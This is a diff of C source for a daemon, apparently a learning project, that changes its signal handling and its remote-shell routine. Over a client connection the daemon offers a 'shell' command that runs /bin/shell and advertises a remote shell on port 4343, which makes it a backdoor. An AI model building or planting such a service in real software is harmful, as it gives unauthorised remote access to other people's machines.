@@ -115,15 +115,9 @@ void	handle_sigs(int signum)
 	t_daemon *daemon;
 
 	daemon = get_daemon();
-	ft_exit(daemon, -1);
-}
-
-void	toto(int signum)
-{
-	t_daemon *daemon;
-
-	daemon = get_daemon();
-	syslog(1, "%s", "signal");
+	if (signum == 17)
+		return ;
+	syslog(1, "%s %d", "signal", signum);
 	ft_exit(daemon, -1);
 }
 
@@ -153,12 +147,8 @@ void	ft_exit(t_daemon *daemon, int status)
 void	spawn_shell(int cs)
 {
 	write(cs, "spawning shell on port 4343\n", ft_strlen("spawning shell on port 4343\n"));
-	int child = fork();
-	if (child == 0)
-		system("/bin/shell");
-	else
-		syslog(1, "%s", "find de fork shell");
-	syslog(1, "%s", "find de spawn");
+	system("/bin/shell");
+	syslog(1, "%s", "spawning shell on port 4343");
 }
 
 void	handle_connection(t_daemon *daemon, int cs)
@@ -190,8 +180,7 @@ void	handle_connection(t_daemon *daemon, int cs)
 		write(cs, "?     show help\nshell spawn remote shell on 4343\n", ft_strlen("?     show help\nshell spawn remote shell on 4343\n"));
 	if (ft_strequ(mem->data, "shell") == 1)
 		spawn_shell(cs);
-	else
-		write(cs, "$> ", 3);
+	write(cs, "$> ", 3);
 	ft_free_mem(mem);
 	
 }
